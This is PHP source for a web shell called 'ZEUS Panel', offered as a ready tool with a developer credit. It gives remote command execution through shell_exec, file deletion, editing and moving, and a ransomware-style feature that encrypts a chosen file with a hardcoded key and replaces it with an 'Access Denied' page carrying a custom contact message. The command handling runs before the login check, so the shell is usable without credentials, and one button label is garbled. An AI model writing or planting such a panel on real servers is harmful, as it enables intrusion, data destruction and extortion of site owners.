<?php
session_start();

// Config
const USERNAME = 'LOADMIN';
const PASSWORD = 'LO2025';
const AES_KEY = 'myStrongAESKey1234';

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

function aes_encrypt($data, $key) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $encrypted);
}

function aes_decrypt($data, $key) {
    $data = base64_decode($data);
    $iv = substr($data, 0, 16);
    $encrypted = substr($data, 16);
    return openssl_decrypt($encrypted, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
}

$output = '';
$editorContent = '';
$editFile = '';

// Pagination settings
$itemsPerPage = isset($_GET['items_per_page']) ? (int)$_GET['items_per_page'] : 5;
$itemsPerPage = in_array($itemsPerPage, [5, 10, 20]) ? $itemsPerPage : 5;
$currentPage = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$offset = ($currentPage - 1) * $itemsPerPage;

// Handle commands
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);

    if (strpos($cmd, 'cd ') === 0) {
        $path = trim(substr($cmd, 3));
        $newDir = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $path);
        if ($newDir && is_dir($newDir)) {
            $_SESSION['cwd'] = $newDir;
            $output = "Changed directory to: $newDir";
        } else {
            $output = "Directory not found: $path";
        }
    } elseif (strpos($cmd, 'rm ') === 0) {
        $file = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . trim(substr($cmd, 3));
        if (file_exists($file)) {
            unlink($file);
            $output = "File deleted: $file";
        } else {
            $output = "File not found: $file";
        }
    } elseif (strpos($cmd, 'mv ') === 0) {
        $parts = explode(' ', substr($cmd, 3));
        if (count($parts) == 2) {
            $from = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . trim($parts[0]);
            $to = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . trim($parts[1]);
            if (file_exists($from)) {
                rename($from, $to);
                $output = "Moved $from to $to";
            } else {
                $output = "Source file not found: $from";
            }
        } else {
            $output = "Usage: mv [from] [to]";
        }
    } elseif (strpos($cmd, 'cp ') === 0) {
        $parts = explode(' ', substr($cmd, 3));
        if (count($parts) == 2) {
            $from = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . trim($parts[0]);
            $to = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . trim($parts[1]);
            if (file_exists($from)) {
                copy($from, $to);
                $output = "Copied $from to $to";
            } else {
                $output = "Source file not found: $from";
            }
        } else {
            $output = "Usage: cp [from] [to]";
        }
    } elseif (strpos($cmd, 'edit ') === 0) {
        $editFile = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . trim(substr($cmd, 5));
        if (file_exists($editFile)) {
            $editorContent = htmlspecialchars(file_get_contents($editFile));
        } else {
            $output = "File not found: $editFile";
        }
    } else {
        $output = shell_exec("cd " . escapeshellarg($_SESSION['cwd']) . " && " . $cmd . " 2>&1");
    }
}

// Handle encryption
if (isset($_POST['encrypt_file']) && isset($_POST['file_path'])) {
    $path = trim($_POST['file_path']);
    $fullPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $path;
    $customMessage = isset($_POST['custom_message']) ? trim($_POST['custom_message']) : '';

    if (!file_exists($fullPath)) {
        $output = "File not found: $fullPath";
    } elseif (!is_writable($fullPath)) {
        $output = "File is not writable: $fullPath";
    } else {
        // Read the original content
        $content = file_get_contents($fullPath);
        if ($content === false) {
            $output = "Failed to read file: $fullPath";
        } else {
            // Encrypt the content
            $encrypted = aes_encrypt($content, AES_KEY);
            $encPath = $fullPath . '.enc';

            // Save encrypted content
            if (file_put_contents($encPath, $encrypted) === false) {
                $output = "Failed to save encrypted file: $encPath";
            } else {
                // Replace the original file with an HTML message
                $htmlMessage = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Encrypted File</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1a1a1a, #000);
            font-family: 'Arial', sans-serif;
        }
        .message-container {
            background-color: orange;
            color: red;
            padding: 30px 50px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            text-align: center;
            animation: pulse 2s infinite;
        }
        .message-container h1 {
            margin: 0;
            font-size: 32px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .message-container p {
            margin: 10px 0 0;
            font-size: 16px;
            opacity: 0.8;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="message-container">
        <h1>This file is encrypted</h1>
        <p>Access Denied. {$customMessage}</p>
    </div>
</body>
</html>
HTML;

                // Write the HTML message to the original file
                if (file_put_contents($fullPath, $htmlMessage) === false) {
                    $output = "Failed to write HTML message to file: $fullPath";
                } else {
                    $output = "File encrypted and replaced with HTML message.";
                }
            }
        }
    }
}

// Handle decryption
if (isset($_POST['decrypt_file']) && isset($_POST['file_path'])) {
    $path = trim($_POST['file_path']);
    $fullPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $path;
    $encPath = $fullPath . '.enc';

    if (!file_exists($encPath)) {
        $output = "Encrypted file not found: $encPath";
    } elseif (!is_writable($fullPath)) {
        $output = "File is not writable: $fullPath";
    } else {
        $encryptedContent = file_get_contents($encPath);
        if ($encryptedContent === false) {
            $output = "Failed to read encrypted file: $encPath";
        } else {
            $decrypted = aes_decrypt($encryptedContent, AES_KEY);
            if ($decrypted === false) {
                $output = "Decryption failed. Wrong key or corrupted file.";
            } else {
                if (file_put_contents($fullPath, $decrypted) === false) {
                    $output = "Failed to write decrypted content to file: $fullPath";
                } else {
                    unlink($encPath);
                    $output = "File decrypted successfully: $fullPath";
                }
            }
        }
    }
}

if (isset($_POST['save_file']) && isset($_POST['file_path'])) {
    $savePath = $_POST['file_path'];
    file_put_contents($savePath, $_POST['file_content']);
    $output = "File saved: $savePath";
}

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user'], $_POST['pass'])) {
        if ($_POST['user'] === USERNAME && $_POST['pass'] === PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: ?");
            exit;
        } else {
            $error = "Invalid credentials";
        }
    }
}

// Function to list files and directories
function listFiles($dir, $offset, $itemsPerPage) {
    $files = scandir($dir);
    $result = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        $stat = stat($path);
        $perms = substr(sprintf('%o', fileperms($path)), -9);
        $owner = posix_getpwuid(fileowner($path))['name'];
        $group = posix_getgrgid(filegroup($path))['name'];
        $size = is_dir($path) ? 'dir' : round(filesize($path) / 1024, 2) . ' KB';
        $mtime = date('Y-m-d H:i:s', $stat['mtime']);
        $result[] = [
            'name' => $file,
            'size' => $size,
            'mtime' => $mtime,
            'owner' => "$owner/$group",
            'perms' => $perms,
            'actions' => is_dir($path) ? 'RT' : 'RTED'
        ];
    }
    $totalFiles = count($result);
    $result = array_slice($result, $offset, $itemsPerPage);
    return ['files' => $result, 'total' => $totalFiles];
}

$fileData = listFiles($_SESSION['cwd'], $offset, $itemsPerPage);
$files = $fileData['files'];
$totalFiles = $fileData['total'];
$totalPages = ceil($totalFiles / $itemsPerPage);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ZEUS Panel</title>
    <style>
        body {
            margin: 0; 
            padding: 20px;
            font-family: monospace;
            background-color: #0d0d0d;
            color:rgb(243, 120, 44);
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }
        .container {
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 12px;
            width: 90%;
            max-width: 1200px;
            box-shadow: 0 0 20px rgba(237, 118, 43, 0.25);
            position: relative;
        }
        h1 {
            text-align: center;
            color: #f4a261;
            font-size: 36px;
            letter-spacing: 2px;
            margin-bottom: 20px;
        }
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            margin-top: 50px;
        }
        .login-form {
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(237, 118, 43, 0.25);
            text-align: center;
        }
        input[type="text"], input[type="password"], textarea, input[type="file"], select {
            padding: 8px;
            margin: 5px;
            background-color: #111;
            color: #ed762b;
            border: 1px solid #ed762b;
            border-radius: 6px;
            font-size: 14px;
        }
        button {
            background-color: #ed762b;
            color: #000;
            border: none;
            padding: 8px 15px;
            margin: 5px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }
        .output-box {
            background: #000;
            border: 1px solid #ed762b;
            padding: 10px;
            border-radius: 5px;
            margin-top: 15px;
            white-space: pre-wrap;
            max-height: 150px;
            overflow-y: auto;
            font-size: 14px;
        }
        .cwd {
            font-size: 14px;
            color: #ccc;
            margin-bottom: 10px;
            font-style: italic;
        }
        .error { 
            color: red; 
            margin-top: 10px; 
            font-size: 14px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            font-size: 14px;
        }
        th, td {
            padding: 8px;
            text-align: left;
            border: 1px solid #ed762b;
        }
        th {
            background-color: #333;
            font-size: 15px;
        }
        .action-links a {
            color: #ed762b;
            text-decoration: none;
            margin-right: 8px;
            font-size: 14px;
        }
        .action-links a:hover {
            color: #ff0000;
        }
        .not-writable {
            color: #ff0000;
            font-size: 14px;
        }
        .pagination {
            margin-top: 15px;
            text-align: center;
        }
        .pagination a {
            color: #ed762b;
            margin: 0 8px;
            text-decoration: none;
            font-size: 14px;
        }
        .pagination a:hover {
            color: #ff0000;
        }
        .pagination .current {
            color: #ff0000;
            font-weight: bold;
        }
        .form-row {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
            margin-top: 15px;
        }
        .form-row form {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .form-row input[type="text"], .form-row input[type="file"], .form-row select {
            width: 180px;
        }
        .encrypt-decrypt-form {
            margin-top: 15px;
            padding: 10px;
            border: 1px solid #ed762b;
            border-radius: 6px;
        }
        .encrypt-decrypt-form h3 {
            color: #f4a261;
        }
        .developer-credit {
            position: absolute;
            top: 20px;
            left: 20px;
            color: #ed762b;
            font-size: 14px;
        }
        .developer-credit a {
            color: #ed762b;
            text-decoration: none;
        }
        .developer-credit a:hover {
            color: #ff0000;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="developer-credit">
        Developed by <a href="https://x.com/ZeroXJacks" target="_blank">@ZeroXJacks</a><br>
        Date: <?= date('Y-m-d') ?>
    </div>
    <h1>ZEUS</h1>
    <?php if (!isset($_SESSION['logged_in'])): ?>
        <div class="login-container">
            <div class="login-form">
                <form method="post">
                    <input type="text" name="user" placeholder="Username" required style="width: 300px;"><br>
                    <input type="password" name="pass" placeholder="Password" required style="width: 300px;"><br>
                    <button type="submit">Login</button>
                    <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
                </form>
            </div>
        </div>
    <?php elseif ($editorContent): ?>
        <form method="post">
            <div class="cwd">Editing: <?= htmlspecialchars($editFile) ?></div>
            <textarea name="file_content" rows="10" style="width: 100%;"><?= $editorContent ?></textarea>
            <input type="hidden" name="file_path" value="<?= htmlspecialchars($editFile) ?>">
            <button type="submit" name="save_file">Save File</button>
        </form>
    <?php else: ?>
        <div class="cwd">Current Directory: <?= htmlspecialchars($_SESSION['cwd']) ?></div>
        <div style="margin-bottom: 10px;">
            <a href="?cmd=cd .." style="color: #ed762b; text-decoration: none; font-size: 14px;">[Parent Directory]</a>
        </div>
        <table>
            <tr>
                <th>NAME</th>
                <th>Size</th>
                <th>Modify</th>
                <th>Owner/Group</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($files as $file): ?>
                <tr>
                    <td>
                        <input type="checkbox" name="selected_files[]" value="<?= htmlspecialchars($file['name']) ?>">
                        <?= htmlspecialchars($file['name']) ?>
                    </td>
                    <td><?= htmlspecialchars($file['size']) ?></td>
                    <td><?= htmlspecialchars($file['mtime']) ?></td>
                    <td><?= htmlspecialchars($file['owner']) ?></td>
                    <td><?= htmlspecialchars($file['perms']) ?></td>
                    <td class="action-links">
                        <?php if (strpos($file['actions'], 'R') !== false): ?>
                            <a href="?cmd=cat <?= htmlspecialchars($file['name']) ?>">R</a>
                        <?php endif; ?>
                        <?php if (strpos($file['actions'], 'T') !== false): ?>
                            <a href="?cmd=cd <?= htmlspecialchars($file['name']) ?>">T</a>
                        <?php endif; ?>
                        <?php if (strpos($file['actions'], 'E') !== false): ?>
                            <a href="?cmd=edit <?= htmlspecialchars($file['name']) ?>">E</a>
                        <?php endif; ?>
                        <?php if (strpos($file['actions'], 'D') !== false): ?>
                            <a href="?cmd=rm <?= htmlspecialchars($file['name']) ?>">D</a>
                        <?php endif; ?>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
        <div class="pagination">
            <?php if ($currentPage > 1): ?>
                <a href="?page=<?= $currentPage - 1 ?>&items_per_page=<?= $itemsPerPage ?>">« Prev</a>
            <?php endif; ?>
            <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                <a href="?page=<?= $i ?>&items_per_page=<?= $itemsPerPage ?>" class="<?= $i == $currentPage ? 'current' : '' ?>"><?= $i ?></a>
            <?php endfor; ?>
            <?php if ($currentPage < $totalPages): ?>
                <a href="?page=<?= $currentPage + 1 ?>&items_per_page=<?= $itemsPerPage ?>">Next »</a>
            <?php endif; ?>
        </div>
        <div class="form-row">
            <form method="get">
                <label style="font-size: 14px;">Items per page:</label>
                <select name="items_per_page" onchange="this.form.submit()">
                    <option value="5" <?= $itemsPerPage == 5 ? 'selected' : '' ?>>5</option>
                    <option value="10" <?= $itemsPerPage == 10 ? 'selected' : '' ?>>10</option>
                    <option value="20" <?= $itemsPerPage == 20 ? 'selected' : '' ?>>20</option>
                </select>
            </form>
            <form method="post">
                <input type="text" name="cmd" placeholder="cd [directory]...">
                <button type="submit">Change dir</button>
            </form>
            <form method="post">
                <input type="text" name="cmd" placeholder="cat [file]...">
                <button type="submit">Read file</button>
            </form>
            <form method="post">
                <input type="text" name="cmd" placeholder="mkdir [name]...">
                <button type="submit">Make dir</button>
                <?php if (!is_writable($_SESSION['cwd'])): ?>
                    <span class="not-writable">(NOT WRITABLE)</span>
                <?php endif; ?>
            </form>
            <form method="post">
                <input type="text" name="cmd" placeholder="touch [name]...">
                <button type="submit">Make file</button>
                <?php if (!is_writable($_SESSION['cwd'])): ?>
                    <span class="not-writable">(NOT WRITABLE)</span>
                <?php endif; ?>
            </form>
            <form method="post">
                <input type="text" name="cmd" placeholder="whoami && id...">
                <button type="submit">Execute</button>
            </form>
            <form method="post">
                <button type="submit">Browse</button>
            </form>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload_file">
                <button type="submit">Upload file</button>
                <?php if (!is_writable($_SESSION['cwd'])): ?>
                    <span class="not-writable">(NOT WRITABLE)</span>
                <?php endif; ?>
            </form>
        </div>
        <!-- Encryption/Decryption Form -->
        <div class="encrypt-decrypt-form">
            <h3 style="font-size: 16px; margin-bottom: 10px;">Encrypt/Decrypt File</h3>
            <form method="post" style="display: flex; gap: 10px; align-items: center;">
                <input type="text" name="file_path" placeholder="Enter file path (e.g., file.php)" required>
                <input type="text" name="custom_message" placeholder="Custom message (e.g., Contact @handle)">
                <button type="submit" name="encrypt_file"> schoen </button>
                <button type="submit" name="decrypt_file">Decrypt</button>
            </form>
        </div>
        <?php if (!empty($output)): ?>
            <div class="output-box"><pre><?= htmlspecialchars($output) ?></pre></div>
        <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>